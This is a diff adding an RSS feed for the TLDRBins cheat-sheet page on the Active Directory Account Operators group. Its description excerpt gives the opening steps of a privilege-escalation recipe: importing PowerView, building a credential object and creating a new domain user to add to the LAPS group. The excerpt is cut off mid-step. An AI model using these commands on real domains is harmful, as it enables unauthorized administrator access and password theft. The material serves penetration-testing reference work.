@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Account Operators on TLDRBins</title>
+    <link>https://tldrbins.github.io/@account-operators/</link>
+    <description>Recent content in Account Operators on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@account-operators/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Account Operators</title>
+      <link>https://tldrbins.github.io/account_operators/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/account_operators/</guid>
+      <description>Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create new user password object $new_user_password = ConvertTo-SecureString &amp;lt;NEW_USER_PASSWORD&amp;gt; -AsPlainText -Force 4. Create new user account # Create a new user New-AdUser &amp;lt;NEW_USER&amp;gt; -enabled $true -accountpassword $new_user_password -Credential $cred # Grant new user privilege (e.</description>
+    </item>
+  </channel>
+</rss>
